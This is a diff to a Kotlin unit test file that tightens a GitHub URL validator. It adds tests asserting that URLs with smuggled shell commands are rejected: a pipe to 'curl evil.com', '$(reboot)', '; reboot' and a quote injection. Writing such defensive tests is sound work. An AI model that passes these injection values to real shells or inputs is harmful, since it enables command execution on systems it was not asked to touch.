@@ -12,12 +12,12 @@ class GitUrlValidatorTest {
     )
 
     @Test
-    fun `valid http GitHub com URL returns true`() = assertTrue(
+    fun `http GitHub com URL returns false`() = assertFalse(
         GitUrlValidator.isValidGitHubUrl("http://github.com/owner/repo"),
     )
 
     @Test
-    fun `bare GitHub com URL returns true`() = assertTrue(
+    fun `bare GitHub com URL returns false`() = assertFalse(
         GitUrlValidator.isValidGitHubUrl("github.com/owner/repo"),
     )
 
@@ -27,8 +27,28 @@ class GitUrlValidatorTest {
     )
 
     @Test
-    fun `valid www GitHub com URL returns true`() = assertTrue(
+    fun `www GitHub com URL returns false`() = assertFalse(
         GitUrlValidator.isValidGitHubUrl("https://www.github.com/owner/repo"),
+    )
+
+    @Test
+    fun `URL with pipe injection returns false`() = assertFalse(
+        GitUrlValidator.isValidGitHubUrl("https://github.com/owner/repo|curl evil.com"),
+    )
+
+    @Test
+    fun `URL with command substitution returns false`() = assertFalse(
+        GitUrlValidator.isValidGitHubUrl("https://github.com/owner/$(reboot)"),
+    )
+
+    @Test
+    fun `URL with space and semicolon returns false`() = assertFalse(
+        GitUrlValidator.isValidGitHubUrl("https://github.com/owner/repo; reboot"),
+    )
+
+    @Test
+    fun `URL with quote injection returns false`() = assertFalse(
+        GitUrlValidator.isValidGitHubUrl("https://github.com/owner/repo'\n"),
     )
 
     @Test
